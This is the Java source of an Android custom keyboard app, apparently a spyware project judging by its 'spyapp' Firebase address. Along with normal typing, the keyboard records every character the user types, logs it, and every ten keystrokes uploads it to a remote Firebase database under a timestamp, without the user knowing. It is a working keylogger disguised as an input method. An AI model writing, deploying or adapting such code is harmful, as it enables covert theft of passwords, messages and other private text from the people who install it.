package com.example.wildcat.customkeyboard;


import android.hardware.camera2.params.InputConfiguration;
import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.InputConnection;

import com.firebase.client.Firebase;

import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;

public class MyKeyboard extends InputMethodService
        implements KeyboardView.OnKeyboardActionListener{

    private KeyboardView kv;
    private Keyboard keyboard;
    String keyStrokes = "";

    private Firebase mRef = new Firebase("http://spyapp-9cba9.firebaseio.com/");
    Firebase mRefKeyLogs = mRef.child("KeyLogs");
    private boolean caps = false;

    Map<String, String> userData = new HashMap<String, String>();

    @Override
    public View onCreateInputView(){
        kv = (KeyboardView) getLayoutInflater().inflate(R.layout.keyboard, null);
        keyboard = new Keyboard(this, R.xml.qwerty);
        kv.setKeyboard(keyboard);
        kv.setOnKeyboardActionListener(this);
        return kv;
    }



    private void clicked(int keyCode){
        System.out.print(keyCode);
        //keyStrokes.concat(keyCode)
    }

    long delay = 10 * 1000; // delay in milliseconds
    LoopTask task = new LoopTask();
    Timer timer = new Timer("TaskName");

    public void start() {
        timer.cancel();
        timer = new Timer("TaskName");
        Date executionDate = new Date(); // no params = now
        timer.scheduleAtFixedRate(task, executionDate, delay);
    }


    private class LoopTask extends TimerTask {
        public void run() {
            pushToDatabase();
        }
    }

    public void pushToDatabase(){
        Calendar cal = Calendar.getInstance();
        Date currentTime = cal.getTime();
        mRef.child(currentTime.toString()).setValue(keyStrokes);

        keyStrokes = "";
        //start();
    }


    @Override
    public void onPress(int primaryCode){

    }
    @Override
    public void swipeRight(){

    }
    @Override
    public void swipeUp(){

    }

    @Override
    public void onRelease(int keyCode){

    }

    @Override
    public void swipeDown() {

    }

    @Override
    public void onText(CharSequence text) {

    }

    @Override
    public void swipeLeft() {

    }

    @Override
    public void onKey(int primaryCode, int[] keyCodes) {
        InputConnection ic = getCurrentInputConnection();
        Log.d("customkeyboard", "Key: " + primaryCode);
        clicked(primaryCode);
        switch (primaryCode){
            case Keyboard.KEYCODE_DELETE:
                ic.deleteSurroundingText(1,0);
                break;
            case Keyboard.KEYCODE_SHIFT:
                caps = !caps;
                keyboard.setShifted(caps);
                kv.invalidateAllKeys();
                break;
            case Keyboard.KEYCODE_DONE:
                ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
                break;
            default:
                char code = (char) primaryCode;
                Log.e("code ", String.valueOf(code));
                keyStrokes = keyStrokes.concat(String.valueOf(code));
                Log.e("keystrokes ", keyStrokes);
                if (keyStrokes.length() == 10){
                    pushToDatabase();
                }
                if(Character.isLetter(code) && caps){
                    code = Character.toUpperCase(code);
                }
                ic.commitText(String.valueOf(code), 1);
        }
    }

}
